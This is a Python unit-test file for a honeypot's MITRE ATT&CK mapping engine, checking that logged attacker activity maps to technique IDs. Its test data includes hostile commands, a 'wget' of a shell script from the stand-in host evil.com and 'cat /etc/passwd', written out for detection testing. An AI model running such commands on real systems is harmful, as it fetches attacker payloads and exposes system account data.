"""Tests for the MITRE ATT&CK mapping engine."""

import unittest
from datetime import datetime, timezone

from honeytrap.events import HoneypotEvent, EventType
from honeytrap.analysis.mitre import MITREMapper


def _make_event(
    event_type: EventType,
    protocol: str = "ssh",
    data: dict | None = None,
    source_ip: str = "192.0.2.1",
) -> HoneypotEvent:
    return HoneypotEvent(
        id="test-event-1",
        timestamp=datetime.now(timezone.utc),
        sensor_id="test-sensor",
        session_id="test-session-1",
        protocol=protocol,
        event_type=event_type,
        source_ip=source_ip,
        source_port=12345,
        data=data or {},
    )


class TestMITREMapper(unittest.TestCase):
    def setUp(self):
        self.mapper = MITREMapper()

    def test_auth_attempt_maps_to_valid_accounts(self):
        event = _make_event(EventType.AUTH_ATTEMPT, data={"username": "root", "password": "toor", "success": True})
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1078", techniques)

    def test_ssh_login_maps_to_remote_services(self):
        event = _make_event(EventType.AUTH_ATTEMPT, protocol="ssh", data={"username": "root", "password": "pass", "success": True})
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1021.004", techniques)

    def test_command_ls_maps_to_file_discovery(self):
        event = _make_event(EventType.COMMAND, data={"command": "ls -la /etc"})
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1083", techniques)

    def test_command_uname_maps_to_system_info(self):
        event = _make_event(EventType.COMMAND, data={"command": "uname -a"})
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1082", techniques)

    def test_command_wget_maps_to_tool_transfer(self):
        event = _make_event(EventType.COMMAND, data={"command": "wget http://evil.com/shell.sh"})
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1105", techniques)
        self.assertIn("T1071.001", techniques)

    def test_command_ifconfig_maps_to_network_discovery(self):
        event = _make_event(EventType.COMMAND, data={"command": "ifconfig"})
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1016", techniques)

    def test_command_cat_passwd_maps_to_data_collection(self):
        event = _make_event(EventType.COMMAND, data={"command": "cat /etc/passwd"})
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1005", techniques)

    def test_brute_force_detection(self):
        """5+ failed auth attempts from same IP in 60s triggers brute force."""
        for i in range(6):
            event = _make_event(
                EventType.AUTH_ATTEMPT,
                data={"username": "root", "password": f"pass{i}", "success": False},
                source_ip="10.0.0.99",
            )
            techniques = self.mapper.analyze_event(event)

        # The 6th attempt should trigger brute force
        self.assertIn("T1110", techniques)

    def test_http_request_maps_to_exploit_public_app(self):
        event = _make_event(
            EventType.HTTP_REQUEST,
            protocol="http",
            data={"method": "GET", "path": "/wp-login.php", "user_agent": "Mozilla/5.0"},
        )
        techniques = self.mapper.analyze_event(event)
        self.assertIn("T1190", techniques)

    def test_get_technique_info(self):
        info = self.mapper.get_technique_info("T1110")
        self.assertIsNotNone(info)
        self.assertEqual(info.name, "Brute Force")
        self.assertEqual(info.tactic, "Credential Access")

    def test_unknown_technique_returns_none(self):
        info = self.mapper.get_technique_info("T9999")
        self.assertIsNone(info)


if __name__ == "__main__":
    unittest.main()
